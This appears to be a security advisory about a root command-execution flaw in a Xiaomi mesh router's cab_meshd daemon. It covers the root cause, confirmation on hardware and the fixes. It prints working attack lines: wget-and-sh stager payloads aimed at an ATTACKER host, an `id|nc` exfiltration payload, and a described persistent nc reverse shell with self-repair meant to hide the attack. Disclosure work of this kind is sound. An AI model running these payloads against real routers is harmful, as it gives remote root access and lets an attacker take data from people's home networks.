# V2 — root command execution (RCE)

**CVSS 8.8 (High), `AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`, for both
hardware-confirmed adjacent paths.** The CAP chain requires the demonstrated
gate-open state; the RE/WAN chain instead requires a factory-reset router and
WAN-side L2 position. After the same forged,
credential-free handshake as V1, an adjacent peer can reach a shell `eval` that
runs as **root** when `NETMODE` leaves the CAP sink open. **Confirmed end-to-end on
physical hardware after minimal initialization** via the OTA combined chain (V1 admin
takeover → encryption-field injection → V2 trigger → interactive root shell over
Wi-Fi). The direct injection variants (CAP/LAN ~4-char, RE/WAN 32/64 reliable
bytes) have different validation levels: CAP/LAN is confirmed in emulation,
while RE/WAN is confirmed end-to-end on factory-reset hardware without V1 or an
admin session. Three paths reach the same sink with different payload budgets —
see *Scope & severity*. Normal Xiaomi web setup can set
`NETMODE=whc_cap`, which skips the demonstrated CAP sink; see
[`CORRECTIONS.md`](CORRECTIONS.md).

## Root cause

A C-level character blacklist in `cab_meshd` is defeated because the attacker's
bytes are carried through **`base64`**, and a downstream root shell script
**re-splits its own arguments** and **`base64 -d`**-decodes one straight into an
**`eval`**.

## The C side is not gated

The `type-7` handler (`0x63e0`) that drives `cap_init` has **no `NETMODE` and no
state gate** — its only preconditions are: connection/body non-NULL, server mode
(`global(0x230)!=0`), `body[0]==1`, and not dry-run (`global(0x1e0)==0`). It then
calls the builder (`0x652c → 0xa3bc`), which base64-**encodes** the wire fields
(`0x2bf8`), runs `check_injection` on the *base64* (`0x9308` — structurally blind),
`snprintf`s the `cap_init` template, and **`system()`s it (`0xa598`)**. NETMODE is
checked only later, in the shell.

## The shell chain (root)

```
mesh_connect.sh:6      . /lib/mimesh/mimesh_init.sh          # sourced: same shell
mesh_connect.sh:1633   cap_init) run_with_lock do_cap_init "$2" … "$9"   # correctly quoted
mesh_connect.sh:22     $@                                     # in run_with_lock: UNQUOTED -> re-splits
do_cap_init:1014       local bh_ssid=$(printf "%s" "$6" | base64 -d)     # decodes attacker bytes back
do_cap_init:1073       buff="{…\"bh_ssid\":\"${bh_ssid}\"…}"; mimesh_init "$buff"
mimesh_init.sh:717     eval "$key=\"`json_get_value \"$params\" \"$key\"`\""   # executes them, as root
```

`check_injection` (blacklist `0xe2c9`: `` @`$#,;'\"[]&*()|<> ``) never sees the
payload because `cab_meshd` base64-encodes the field first; `run_with_lock`'s
unquoted `$@` re-splits the arguments so the planted field lands as `do_cap_init`'s
`$6`; and `base64 -d` restores the blocked characters straight into `eval`.

## Delivery (CAP/LAN path)

The attacker-controlled field that reaches `$6` is the 19-byte **plant** at type-4
`body[0x90]` (`→ conn+0x10e`, `strncpy` `0x6058`). A five-word pad shifts a base64
payload into `$6`:

```
type-4 body[0x90] = "a a a a a " + base64(`CMD`)
  -> run_with_lock $@ re-splits -> do_cap_init $6 = base64(`CMD`)
  -> base64 -d -> `CMD` -> mimesh_init eval  (root)
```

Full driver: `poc/rce_poc.py --cmd '…'` (or `poc/handshake.py --plant '…'`).

## Proof (emulation, stock binary + scripts)

Under the qemu-user harness running the real `cab_meshd` with a clean config
(`NETMODE` unset), a client that completed `4→5→7` and put
`base64("`>W`")` in the plant caused `mimesh_init.sh:717`'s `eval` to execute the
redirect **as root**, creating file `/W` (root:root). Independently reproduced.
`bh_ssid` also showed `uid=0(root)…` for an `` `id` `` payload. This is arbitrary
root command execution from an unauthenticated TCP client, through the full daemon
path.

## OTA combined chain — confirmed on hardware

The `mgmt_2g` and `mgmt_5g` keys in the `mimesh_init` eval sink (`:717`) are sourced
from `uci get wireless.<iface>.encryption` (`do_cap_init:1007/1010`). Unlike
`bh_ssid`/`bh_pswd`, these values are **not** base64-laundered by the daemon — they
flow from UCI into the `eval` **raw**. They are admin-settable via
`api/xqnetwork/set_wifi_without_restart`, and the `encryption` parameter is on the
`hackCheck` **exemption list** (like password/SSID fields), so arbitrary shell
metacharacters — including `"`, `\`, spaces, `#` — pass through the web layer and
into UCI unsanitised.

### The chain

| Step | What | Requires |
|---|---|---|
| 1 | V1 leaks `web_passwd256` over TCP 19553 (pre-auth) → mint admin `stok` | Wi-Fi adjacency |
| 2 | `set_wifi_without_restart` plants payloads in `encryption` for 2.4 GHz and 5 GHz bands | Admin `stok` from step 1 |
| 3 | `rce_poc.py`-style `4→5→7` trigger fires `cap_init` | Wi-Fi adjacency (same as step 1) |
| 4 | `do_cap_init` reads `encryption` via `uci get` → `mimesh_init` `eval` runs it as **root** | — |

### Payload construction

The 2.4 GHz `encryption` carries the fetch stage, the 5 GHz carries the exec stage:

```
2.4G encryption = \" wget http://ATTACKER:8000/s -O /tmp/x #
5G   encryption = \" sh /tmp/x #
```

When `mimesh_init.sh:717` evaluates:
```
eval "mgmt_2g=\"`json_get_value \"$params\" \"mgmt_2g\"`\""
```
`parse_json` un-escapes `\"` → `"`. The eval becomes:
```
mgmt_2g="" wget http://ATTACKER:8000/s -O /tmp/x #"..."
```
The shell assignment-prefix trick (`VAR=val cmd`) runs `wget` as root. The `#`
comments out the trailing garbage. The 5 GHz band fires `sh /tmp/x` the same way.

### Why hackCheck doesn't block it

`XQSecureUtil.hackCheck` (applied by `luci.http.formvalue`) blocks `` ;|$&`\n ``
in request parameters. But `encryption` is on the **36-name exemption list** (along
with `password`, `ssid`, `username`, etc.) — the web layer passes it through
unsanitised because users can legitimately type special characters in Wi-Fi passwords.
The `\"` breakout and `#` comment need only `"`, `\`, `#`, and spaces — none of which
are on the `hackCheck` blacklist even for non-exempt parameters.

### Payload budget

**Unlimited.** The `encryption` UCI value has no meaningful length cap, unlike the
CAP plant (~4 chars) or RE fields (32/64 reliable bytes; 36/66 encoder caps). This makes the OTA chain the
practical exploitation path: it can deliver a full `wget|sh` stager, a reverse shell,
or any arbitrary script.

### Self-repairing payload

The stager (`/s`) served by the attacker:
1. Sends a proof callback: `GET /pwned?uid=$(id -u)_user=$(id -un)_host=$(uname -n)`
2. Self-repairs the Wi-Fi: a background loop detects the poisoned `encryption` values,
   replaces them with valid `psk2` + a known key, and runs `wifi reload` — so the AP
   comes back online and the attacker's laptop can reconnect.
3. Opens a persistent reconnecting reverse shell (`mkfifo` + `nc` to attacker:4444)
   that retries every 10 seconds.

The device stays fully operational throughout. The attacker gets an interactive root
shell over Wi-Fi without the target ever going offline.

### Proof (physical hardware)

Reproduced multiple times on a physical RD03v2 (`romversion 2.0.28`):

```
*** ROOT CALLBACK: /pwned?uid=0_user=root_host=XiaoQiang ***
```

Interactive root shell output:
```
uid=0(root) gid=0(root)
Linux XiaoQiang 4.4.60 #0 SMP PREEMPT ... armv7l GNU/Linux
RD03v2
```

Full evidence in `evidence/hardware-validation.md`. PoC: `poc/ota_rce.py`.

## Direct RE/WAN chain — confirmed on factory-reset hardware

The RE path was reproduced end-to-end on the same physical RD03v2 running stock
2.0.28. The final run began at factory defaults (`init_info.inited=0`) and used no
web session, V1 leak, admin API, or `init_router.py`:

1. Stock runtime port assignment populated `network.wan.ifname=eth1.4` before
   `START=99`; `cab_meshd -C -i eth1.4` obtained DHCP address `192.168.77.142`.
2. The RE broadcast `MIROUTE_RE_DDv1.0` on UDP/19553. The rogue CAP replied with
   `MIROUTE_CAP_DDv1.0` plus its IP and accepted the RE's outbound TLS connection.
3. The RE sent type-4 authentication with the `q38d…` role key. The rogue CAP sent
   its type-4 authentication with the statically predicted `x38d…` key; the RE
   accepted it and replied type-5 success.
4. The rogue CAP sent a 1,764-byte type-6 body shaped like the stock CAP builder's
   output, with a command expression in `bh_pswd`.
5. Stock `cab_meshd` base64-encoded that field, invoked `mesh_connect.sh re_init`,
   and `mimesh_init.sh` executed it as root. The proof payload was
   `` `id|nc 192.168.77.1 80` `` (23 bytes).

Observed callback:

```
uid=0(root) gid=0(root)
```

### Wire-layout correction required for exploitation

The static offset mapping was correct but incomplete. A factory CAP sync body has
empty front-haul password and management fields. `run_with_lock` invokes unquoted
`$@`, so ash drops those empty words and shifts the later arguments: an otherwise
authentic type-6 body does **not** land `body+0xe6`/`body+0x107` in
`do_re_init` `$7`/`$8`. The working message fills the four preceding fields with
ordinary nonempty password and management values for both bands, preserving
all nine string positions. The daemon's C blacklist still sees only base64.

The encoder limits remain 36 bytes (`bh_ssid`) and 66 bytes (`bh_pswd`). Their
adjacent NUL-terminated wire slots provide reliable non-overlapping capacities of
32 and 64 bytes; carefully arranged overlap can use additional encoder headroom.
The 23-byte root proof fits without overlap.

### State transition

The RE shell entry has no `NETMODE` guard and `check_re_initted` remains dead code,
but a successful `re_init` continues through `mimesh_init`, sets `INITTED=YES`, changes
the wired client from the WAN MAC to the LAN MAC, and stops `cab_meshd`. The live
path is therefore effectively **one-shot per factory reset**, despite the absence
of the earlier guard. Failed or interrupted sync attempts may reconnect while the
router remains uninitialized.

PoC: `poc/re_wan_rce.py`.

## Scope & severity — three variants

**OTA combined chain** (V1 → admin API → V2 trigger, over Wi-Fi):
- **Confirmed end-to-end on physical hardware** after minimal initialization
  left `NETMODE` unset (above).
- **Unlimited payload budget** — no length cap on the `encryption` UCI value.
- Requires the V1 admin takeover first (automated, pre-auth, same Wi-Fi adjacency).
- A completed `cap_init` can close the gate with `NETMODE=whc_cap`; treat the
  trigger as one-shot when preparing the payload. The demonstrated root
  callback ran before any such closure.

**CAP / LAN path** (`cab_meshd -S -i br-lan`, started when `INITTED=YES` — an
initialized router with a gate-open mode; the same listener V1 uses):
- **Confirmed in emulation** (root-owned file via daemon-driven trigger).
- **~4-character one-shot.** The plant is 19 bytes; after the pad, ~8 base64 chars
  → ~6 raw bytes incl. backticks → a ~4-char command (`id`, `>W`, …). The larger
  `%s` args (`$6/$7` in the daemon template) are `base64(CAP's own SSID/pswd)`, not
  attacker-controlled, so they cannot carry the payload. A completed `cap_init`
  can set `NETMODE=whc_cap`, gating the sink. Normal web setup can set it too.
  This is a tightly-budgeted root primitive in the gate-open state.

**RE / WAN path** (`cab_meshd -C -i <wan>`, conditional on `INITTED!=YES`,
`proto=dhcp`, and a nonempty WAN interface name): **confirmed end-to-end on
factory-reset physical hardware**.
- **No V1 or initialization step.** The target initiated discovery and TLS from
  its WAN lease while `INITTED=0`; no web login or admin API call was used.
- **Runtime startup confirmed.** Although the shipped static WAN name is empty,
  `port_service` assigned `eth1.4` during boot before `cab_meshd` started. The
  gateway check passed with an ordinary DHCP lease and `/tmp/cab_meshd_gw_ip`.
- **Reversed authentication confirmed.** The RE accepted the rogue CAP's
  `x38d364d8ed3bd085e150211ea6b3715` HMAC and entered `ST_RUNNING` over TLS 1.2
  without client certificates.
- **Delivery confirmed.** A correctly shaped type-6 body placed base64-laundered
  data from `body+0xe6`/`body+0x107` into `do_re_init` `$7`/`$8`; a 23-byte
  `` `id|nc ATTACKER 80` `` payload returned `uid=0(root) gid=0(root)`.
- **Argument alignment matters.** The four earlier password/management fields must
  be nonempty or unquoted `$@` drops them and moves the controlled fields away from
  the sink.
- **Budget.** The encoder caps remain 36/66 bytes. Reliable non-overlapping fields
  hold 32/64 bytes; overlap layouts can recover some of the remaining headroom.
- **One-shot after success.** `do_re_init` is not guarded, but successful mesh
  initialization sets `INITTED=YES` and stops `cab_meshd`, closing the factory RE
  path until another reset.

## Honest status

**Both the OTA combined chain and the direct factory RE/WAN chain are confirmed
end-to-end on physical hardware.**
The full sequence — pre-auth admin takeover, encryption-field injection,
`cap_init` trigger, root callback (`uid=0`), interactive root shell — was reproduced
multiple times on a physical RD03v2 running `romversion 2.0.28`. The device stayed
online throughout (self-repairing payload). This is the definitive proof that V2 is
a real root RCE on stock hardware in that state. It does not establish the same
reachability after normal web setup sets `NETMODE=whc_cap`.

The direct **CAP/LAN path** remains confirmed in emulation. The direct **RE/WAN
path** was run from `INITTED=0` through WAN DHCP, discovery, reversed HMAC/TLS,
type-6 delivery, and a root identity callback on the physical device. This result
also corrects two earlier statements: successful `re_init` makes the exposure
one-shot by setting `INITTED=YES`, and empty preceding fields must be populated to
keep the vulnerable arguments in `$7/$8`.

## Fix
Quote `$@` in `run_with_lock`; never `base64 -d`→`eval` peer data; don't rely on the
base64-launderable C blacklist; and close the shared entry point (per-device mesh
auth, client-cert TLS). See `remediation.md`.
